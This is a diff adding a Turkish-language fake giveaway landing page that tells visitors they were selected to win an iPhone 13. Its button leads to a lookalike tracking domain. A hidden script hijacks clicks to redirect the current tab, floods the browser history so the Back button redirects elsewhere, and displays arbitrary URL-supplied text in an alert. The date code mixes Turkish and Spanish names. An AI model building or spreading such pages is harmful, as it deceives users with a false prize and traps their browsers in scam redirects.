@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<base href="../">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>WinIPhone</title>
+<link rel="icon" type="image/x-icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQ1IDc5LjE2MzQ5OSwgMjAxOC8wOC8xMy0xNjo0MDoyMiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTkgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkQ1QTkyRjlCODFEMjExRURCMjY1RjYxMzE3MTY3RDAxIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkQ1QTkyRjlDODFEMjExRURCMjY1RjYxMzE3MTY3RDAxIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6RDVBOTJGOTk4MUQyMTFFREIyNjVGNjEzMTcxNjdEMDEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6RDVBOTJGOUE4MUQyMTFFREIyNjVGNjEzMTcxNjdEMDEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz681NlcAAAAHElEQVR42mL8//8/AymAiYFEMKphVMPQ0QAQYABVbQMd0MbiHwAAAABJRU5ErkJggg=="/>
+<link rel="stylesheet" href="css/style.css" />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />
+<script>
+function getURLParameter(name) {
+    name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+    var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
+        results = regex.exec(location.search);
+    return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
+}
+function dateOffset(f, c) {
+    var b = new Boolean(null == f || 0 == f || void 0 == f || "" == f),
+        h = new Date(Date.now() - 24 * f * 60 * 60 * 1000);
+    1 == b && (f = 0);
+    var d = ["Pazar", "Pazartesi", "Salı", "Çarşamba", "Perşembe", "Cuma", "Cumartesi"],
+        g = ["enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre"];
+    return null != !c && 0 != !c && void 0 != !c
+        ? h.getDate() + " " + g[h.getMonth()]
+        : "day_name_only" == c && b
+        ? d[h.getDay()]
+        : "top_date" == c && b
+        ? d[h.getDay()] + ", " + h.getDate() + " " + g[h.getMonth()] + " " + h.getFullYear()
+        : void 0;
+}
+</script>
+</head>
+<body>
+<div class="wrapper">
+    <div class="header__logo">
+
+    <div class="logo">
+        <img src="img/logo.png" alt="" />
+        <span>Hediye zamanı</span>
+    </div>
+    <div class="time"></div>
+</div>
+    <div class="intro">
+        Her
+        <span id="today">
+            <script>
+                document.write(dateOffset(0, "day_name_only"));
+            </script>
+        </span>
+        , sponsorlarımızdan ödüller kazanma fırsatı vermek için 5 kullanıcı seçiyoruz.
+    </div>
+    <div class="header__text">
+        Çizim oyuncusu olarak seçildiniz
+    </div>
+
+    <div class="main">
+        <div class="main__img">
+            <img src="img/main.png" alt="" />
+        </div>
+
+        <div class="main__title"><span>iPhone 13</span> kazanın</div>
+        <div class="main__text">
+        </div>
+    </div>
+    <div class="main__btn">
+        <a href="https://coogletrck3.com/click.php?lp=1" class="mainButton main__button"><strong>DEVAM ETMEK</strong></a>
+    </div>
+</div>
+<script>
+    const now = new Date();
+    const year = now.getFullYear();
+    const month = now.getMonth();
+    const day = now.getDate();
+    let all = `${day}/${month + 1}/${year}`;
+    const time = document.querySelector(".time");
+    time.innerText = `${day}/${month + 1}/${year}`;
+    const browser = document.querySelector(".browser");
+</script>
+<script>
+var cta = 'mainButton';
+var back = 'https://coogletrck3.com/chh9l3k.php?key=0lp9k1kle3m19wqtwn9o';
+var under = 'https://coogletrck3.com/chh9l3k.php?key=1ljqrx4lpjqw93hr8i6m';
+if(typeof under!=="undefined"&&under!==null){if(typeof cta!=="undefined"&&cta!==null){document.addEventListener('click',function(event){var target=event.target;while(target){if(target.tagName==='A'&&target.classList.contains(cta)){const linkHref=target.href;event.preventDefault();window.open(linkHref,'_blank');window.location.replace(under);break;}
+target=target.parentNode;}});}else{document.addEventListener('click',function(event){var target=event.target;while(target){if(target.tagName==='A'){const linkHref=target.href;event.preventDefault();window.open(linkHref,'_blank');window.location.replace(under);break;}
+target=target.parentNode;}});}}
+if(typeof back!=="undefined"&&back!==null){!(function(){var t;try{const URL=window.location.href.split(/[#]/)[0];for(t=0;10>t;++t)history.pushState({},'',URL+'#');onpopstate=function(event){event.state&&location.replace(back);};}catch(o){console.log(o);}})();}
+function getURLParameter_location(e){return decodeURI((RegExp(e+"=(.+?)(&|$)").exec(location.search)||[,null])[1]||"")}function getURLParameter_hash(e){return decodeURI((RegExp(e+"=(.+?)(&|$)").exec(location.hash)||[,null])[1]||"")}function getURLParameter(e){var a=null;return getURLParameter_hash(e)?getURLParameter_hash(e):getURLParameter_location(e)} if( getURLParameter('alert') ){ setTimeout( function(){ alert( getURLParameter('alert') ) }, 500 ); }</script>
+</body>
+</html>
